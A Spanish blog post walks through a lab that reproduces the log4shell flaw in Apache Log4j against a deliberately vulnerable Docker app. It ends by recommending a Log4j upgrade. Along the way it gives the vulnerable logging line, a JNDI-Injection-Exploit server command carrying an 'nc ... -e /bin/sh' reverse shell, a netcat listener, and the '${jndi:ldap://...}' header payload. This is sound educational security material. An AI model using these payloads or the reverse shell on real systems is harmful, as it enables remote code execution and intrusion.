---
title: "Acerca de log4shell"
date: 2025-06-07T10:30:00-06:00
draft: false
tags: ["Java","Backend"]
image: /images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png
categories:
    - Linux
    - Java
---

log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j  se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.

### Como Funciona?
 
Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) 

```
git clone https://github.com/christophetd/log4shell-vulnerable-app.git
docker run --name vulnerable-log4 -p 8081:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```

![Name](/images/1d851fb4f2c85bf3e0498b263832fa16012931205a239a371f42cefc5ec6ca576036b9915ebd7849c48426f3c069cdcbb5b54bf2455dc724602eaca20ae1eb6c.png)


una vez descargado vamos analizar el código para ver en qué forma puede ser vulnerable 

![Name](/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png)

La parte que nos interesa es: 

```java
    @GetMapping("/")
    public String index(@RequestHeader("X-Api-Version") String apiVersion) {
        logger.info("Received a request for API version " + apiVersion);
        return "Hello, world!";
    }

```
Y en especial esta ya que es la parte vulnerable : 

```java

logger.info("Received a request for API version " + apiVersion);
```

después vamos a necesitar un servidor LDAP que nos permita ejecutar los comandos  [https://github.com/welk1n/JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)  


```
java -jar JNDI-Injection-1.0-SNAPSHOT-all.jar -C "nc 172.17.0.1 4444 -e /bin/sh" 
nc -lvp 4444
```

![Name](/images/8b704fcf71dbb7ed35fde12e48b6702579dcea428aba4300bca4b2b8121304bec29426740971334b5fd1d2f67a0556bbd8e2256f623cffd925fceba73caaefed.png)

Solo hacemos un http request con el header X-Api-Version y con la dirección que nos proporcionó JNDI Injection


``` http 
GET / HTTP/1.1
Host: 192.168.1.141:8081
X-Api-Version: ${jndi:ldap://172.17.0.1:1389/zlrpms} 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```



![Name](/images/d95ee3cf726654238c8d22e1bd33dc9ef77e30f140abd9200f28397d0bd713247747c1f2aa70d503c237969780ceac41b9e8311108044fc84c960710c28433f4.png)


![Name](/images/40068b8357a248e64f7103c590e433798614cc565f55a3d07a81a5ef5dbc868bac37cb6cc696f2495e53719253fe2ed82070cfa31e6b09ae7e8ada788d881be5.png)


debido a que la vulnerabilidad ya se encuentra arreglada en las nuevas versiones de Log4j  solo queda actualizar 




